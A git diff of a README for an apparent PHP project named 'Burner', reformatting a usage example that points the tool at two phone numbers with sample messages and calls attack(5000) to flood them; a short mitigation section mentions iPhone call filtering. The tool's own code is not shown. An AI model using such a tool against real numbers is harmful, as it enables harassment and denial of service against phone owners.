@@ -4,18 +4,20 @@ This project demonstrates how simple it is to burn a phone number and also descr
 
 # Usage
 
-	<?php
-		
-		require_once "Burner.php";
-		
-		$targets  = ["8005551234", "8005556789", ];
-		$messages = ["Hello World A", "Hello World B", "Hello World C", ];
-		
-		$dos = new Burner($targets, $messages);
-		$dos -> attack(5000);
-		
-	?>
-	
+```
+<?php
+
+  require_once "Burner.php";
+
+  $targets  = ["8005551234", "8005556789", ];
+  $messages = ["Hello World A", "Hello World B", "Hello World C", ];
+
+  $dos = new Burner($targets, $messages);
+  $dos -> attack(5000);
+
+?>
+```
+  
 # Mitigation
  
  Apple iPhones at least allow you to filter out phone numbers not in contacts. Sadly,
